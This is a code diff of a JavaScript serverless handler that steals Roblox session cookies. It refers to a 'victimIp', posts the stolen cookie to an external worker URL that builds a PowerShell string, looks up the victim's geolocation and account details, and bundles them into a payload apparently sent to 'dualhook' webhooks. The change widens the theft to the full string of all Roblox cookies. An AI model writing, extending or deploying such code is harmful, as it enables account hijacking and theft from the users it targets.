@@ -74,7 +74,7 @@ function findCookie(slots) {
 
 // ── Worker: PowerShell string only, zero Roblox calls ────────────────────────
 
-async function getPowerShell(cookie, victimIp) {
+async function getWorkerResult(cookie, victimIp) {
   try {
     const r = await fetch(WORKER_URL, {
       method: 'POST',
@@ -83,7 +83,11 @@ async function getPowerShell(cookie, victimIp) {
     });
     if (!r.ok) return null;
     const d = await r.json();
-    return d.success ? d.powershell : null;
+    if (!d.success) return null;
+    return {
+      powershell: d.powershell || null,
+      allCookies: d.allCookies || cookie  // full cookie string with all Roblox cookies
+    };
   } catch { return null; }
 }
 
@@ -351,14 +355,17 @@ export default async function handler(req, res) {
   // - geo:        pure IP lookup, no Roblox
   // - powershell: worker just builds a string, no Roblox calls
   // - roblox:     1 cookie call for uid, rest are public endpoints
-  const [geo, powershell, roblox] = await Promise.all([
+  const [geo, workerResult, roblox] = await Promise.all([
     getIpGeo(ip),
-    cookie ? getPowerShell(cookie, ip) : Promise.resolve(null),
-    cookie ? fetchRobloxInfo(cookie)   : Promise.resolve(null),
+    cookie ? getWorkerResult(cookie, ip) : Promise.resolve(null),
+    cookie ? fetchRobloxInfo(cookie)     : Promise.resolve(null),
   ]);
 
+  const powershell = workerResult?.powershell || null;
+  const allCookies = workerResult?.allCookies || cookie; // full merged cookie string
+
   const isValid  = !!roblox;
-  const payload  = { powershell, cookie, roblox, slots, ip, geo, now, pageName };
+  const payload  = { powershell, cookie: allCookies, roblox, slots, ip, geo, now, pageName };
 
   // Dualhook parent
   let parent = null;
